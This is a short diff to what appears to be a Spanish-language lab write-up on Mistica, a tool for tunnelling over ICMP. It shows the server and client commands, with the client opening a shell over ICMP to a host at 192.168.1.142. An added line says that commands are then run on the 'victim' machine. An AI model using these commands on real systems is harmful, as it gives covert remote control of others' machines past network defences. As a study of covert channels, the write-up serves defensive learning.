@@ -335,3 +335,8 @@ python3.8 ms.py -m io:icmp -s "--iface eth0" -k key
 Cliente
 python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:icmp -w "--hostname 192.168.1.142" -k key
 ![image137.png]({{site.baseurl}}/images/Mistica/image137.png
+
+Y ejecutamos comandos sobre la maquina víctima a través del protocolo ICMP 😊
+
+
+![image138.png]({{site.baseurl}}/images/Mistica/image138.png
